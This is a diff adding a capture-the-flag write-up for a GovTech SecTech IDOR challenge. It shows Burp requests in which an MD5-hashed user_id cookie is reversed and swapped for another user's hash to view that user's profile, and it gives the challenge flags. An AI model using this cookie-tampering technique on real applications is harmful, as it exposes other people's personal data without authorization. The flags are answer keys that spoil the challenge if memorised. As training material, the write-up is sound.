@@ -38,3 +38,60 @@ Let's visit that - http://sec-tech.cf/transcript.php?user=temp_acc&password=temp
 
 Flag:
 WH2020{Loc@l_F1l3_Inclus10n_buT_N0t_sh3ll}
+
+# GovTech SecTech (2/6) - IDOR
+### Description
+Insecure Direct Object Reference can have severe repercussions for applications. One mitigation technique is to avoid trusting user input. If you are tired, have some cookies with milk?
+### Solution
+
+When we visit anywhere in the webpage we notice in Burp Intruder,
+``````
+GET /profile.php HTTP/1.1
+Host: sec-tech.cf
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id=c4ca4238a0b923820dcc509a6f75849b
+Upgrade-Insecure-Requests: 1
+``````
+IDOR (Insecure Direct Object Reference) is a easy-to-find yet serious vulnerability affecting web applications. This occurs when user-controlled input is used to access objects in applications
+
+Notice that the user_id in the Cookie: header is a MD5 hash. We can try and search up that hash online - https://md5.gromweb.com/?md5=c4ca4238a0b923820dcc509a6f75849b
+
+``````
+The MD5 hash:
+c4ca4238a0b923820dcc509a6f75849b
+was succesfully reversed into the string:
+1
+``````
+Therefore the we can modify the user_id parameter to a different number - https://www.md5hashgenerator.com/
+``````
+Your Hash: c81e728d9d4c2f636f067f89cc14862c
+Your String: 2
+``````
+And send it in Burp to profile.php
+``````
+GET /profile.php HTTP/1.1
+Host: sec-tech.cf
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: sectech=YToyOntzOjQ6InVzZXIiO3M6ODoidGVtcF9hY2MiO3M6NToiYWRtaW4iO2I6MDt9; PHPSESSID=eab13e70980504c609cf4b5b3b8764b8; user_id= c81e728d9d4c2f636f067f89cc14862c
+Upgrade-Insecure-Requests: 1
+``````
+In Burp Suite, we can view the table
+``````
+Item 	Value
+Name 	Billie Jean
+Role 	Perm Staff
+Date of Birth 	1st July 1988
+Email 	billie_jean@sectech.com.sg
+Flag 	WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}
+``````
+
+Flag:
+WH2020{ID0R_D0_N0T_TRUST_US3R_INPUT}
